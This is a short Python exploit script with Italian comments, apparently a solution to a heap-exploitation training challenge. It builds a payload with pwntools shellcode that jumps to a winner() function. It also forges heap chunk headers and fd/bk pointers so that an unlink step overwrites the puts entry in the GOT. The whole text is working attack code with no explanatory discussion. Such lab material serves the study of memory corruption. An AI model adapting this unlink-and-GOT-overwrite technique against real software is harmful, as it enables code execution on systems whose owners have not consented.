#!/usr/bin/env python3
 
import struct
import sys
import pwnlib
 
PUTS = 0x804c13c - 12 # Posizione dell'indirizzo della funzione puts nella GOT
WINNER = 0x080487d5   # Indirizzo della funzione winner()
RETADDR = 0xf7e69000 + 12  # Indirizzo a cui il EIP salta dopo aver chiamato puts()
 
# Chunk A
out  = b""
 
pwnlib.context.arch = "i386"
shellcode = pwnlib.shellcraft.i386.push(WINNER)
shellcode += pwnlib.shellcraft.i386.ret()
shellcode = pwnlib.asm.asm(shellcode, arch='i386')
 
out += b"\x90"*4 + shellcode
 
# Chunk B
out += b" " + b"B"*32 # Inizio dell'argomento per il chunk B
out += struct.pack("I", 0xfffffffc) # prev_size
out += struct.pack("I", 0xffffffb0) # size
 
# Chunk C
out += b" CCCC" # Inizio dell'argomento per ilr chunk C
out += struct.pack("I", PUTS) # P->fd
out += struct.pack("I", RETADDR) # P->bk
print(out)